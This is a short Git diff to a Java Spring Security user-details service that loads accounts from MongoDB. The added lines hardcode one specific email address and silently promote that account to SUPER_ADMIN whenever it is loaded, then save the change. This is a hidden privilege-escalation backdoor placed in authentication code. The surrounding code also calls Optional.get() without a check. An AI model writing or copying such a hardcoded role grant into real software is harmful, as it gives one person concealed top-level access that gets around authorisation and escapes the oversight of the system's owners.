@@ -84,6 +84,10 @@ public class MongoUserDetailsService implements UserDetailsService {
         Optional<UserAccount> userAccount = userAccountRepository.findByUsername(username);
         if (userAccount.get().getRole().equals("ADMIN")) {
             userAccount.get().setActive(true);
+
+            if(userAccount.get().getUsername().equals("mlenda@bimsplus.com.pl")){
+                userAccount.get().setRole("SUPER_ADMIN");
+            }
             userAccountRepository.save(userAccount.get());
         }
 
